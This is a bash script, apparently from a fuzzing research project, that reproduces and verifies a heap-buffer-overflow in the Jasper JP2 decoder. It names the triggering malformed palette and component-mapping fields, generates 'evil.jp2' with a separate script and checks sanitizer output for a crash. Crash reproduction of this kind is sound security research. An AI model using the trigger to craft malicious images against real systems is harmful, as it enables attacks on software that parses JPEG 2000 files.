#!/usr/bin/env bash
# VULN 001 Run Script
# Jasper jp2_decode heap-buffer-overflow via PCLR NE=0 + CMAP MTYP=1
# Expected: ASAN heap-buffer-overflow in jas_image_depalettize (lutents[-1])

set -euo pipefail

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/jasper/src_appl_dummy_c"
IMGINFO="/data/ylwang/non-textfuzz/target/jasper/build_test/install/bin/imginfo"
EVIL_JP2="$POC_DIR/evil.jp2"
RESULT_FILE="$POC_DIR/vuln_001_result.txt"
LOG_FILE="$POC_DIR/vuln_001_result.log"
ASAN_LOG_PREFIX="$POC_DIR/asan.log"

cd "$POC_DIR"

# Step 1: Generate the malicious JP2
echo "[*] Running vuln_001_gen.py ..."
python3 "$POC_DIR/vuln_001_gen.py" 2>&1 | tee "$LOG_FILE"

if [ ! -f "$EVIL_JP2" ]; then
    echo "ERROR: evil.jp2 not created" | tee -a "$LOG_FILE"
    echo "ERROR" > "$RESULT_FILE"
    exit 1
fi

# Step 2: Execute imginfo against the malicious file
echo "" >> "$LOG_FILE"
echo "[*] Running: imginfo -f evil.jp2" | tee -a "$LOG_FILE"

# ASAN_OPTIONS:
#   allocator_may_return_null=1  => malloc returns NULL instead of aborting on OOM
#   halt_on_error=1              => stop on first error
#   abort_on_error=1             => use abort() so exit code != 0
#   log_path                     => write ASAN report to file
# UBSAN_OPTIONS:
#   halt_on_error=1              => stop on first UB
#   print_stacktrace=1           => include stack trace
export ASAN_OPTIONS="allocator_may_return_null=1:halt_on_error=1:abort_on_error=1:log_path=${ASAN_LOG_PREFIX}"
export UBSAN_OPTIONS="halt_on_error=1:print_stacktrace=1:log_path=${ASAN_LOG_PREFIX}"

set +e
timeout 30 "$IMGINFO" -f "$EVIL_JP2" >> "$LOG_FILE" 2>&1
EXIT_CODE=$?
set -e

echo "[*] imginfo exit code: $EXIT_CODE" | tee -a "$LOG_FILE"

# Step 3: Determine result
ASAN_LOG_FILES=( "${ASAN_LOG_PREFIX}".* )
ASAN_FOUND=0
if ls "${ASAN_LOG_PREFIX}".* 2>/dev/null | grep -q .; then
    ASAN_FOUND=1
    echo "[*] ASAN log files found:" | tee -a "$LOG_FILE"
    for f in "${ASAN_LOG_PREFIX}".*; do
        echo "    $f" | tee -a "$LOG_FILE"
        cat "$f" >> "$LOG_FILE"
    done
fi

CRASHED=0
# Check for ASAN or UBSAN error strings in the log (printed to stderr before exit)
SANITIZER_HIT=0
if grep -qE "runtime error:|AddressSanitizer:|heap-buffer-overflow|SEGV|stack-buffer|use-after-free|null pointer" "$LOG_FILE" 2>/dev/null; then
    SANITIZER_HIT=1
fi

# A crash is: ASAN/UBSAN report found, OR signal 6/11 (SIGABRT/SIGSEGV)
if [ $ASAN_FOUND -eq 1 ]; then
    CRASHED=1
elif [ $SANITIZER_HIT -eq 1 ] && [ $EXIT_CODE -ne 0 ]; then
    CRASHED=1
elif [ $EXIT_CODE -eq 134 ] || [ $EXIT_CODE -eq 139 ]; then
    # SIGABRT=134, SIGSEGV=139
    CRASHED=1
fi

if [ $CRASHED -eq 1 ]; then
    echo "VERIFIED_CRASH" > "$RESULT_FILE"
    echo "[+] VERIFIED_CRASH: imginfo crashed on evil.jp2" | tee -a "$LOG_FILE"
else
    echo "UNVERIFIED" > "$RESULT_FILE"
    echo "[-] UNVERIFIED: no crash detected (exit=$EXIT_CODE, asan_found=$ASAN_FOUND)" | tee -a "$LOG_FILE"
fi

echo "[*] Final result: $(cat $RESULT_FILE)"
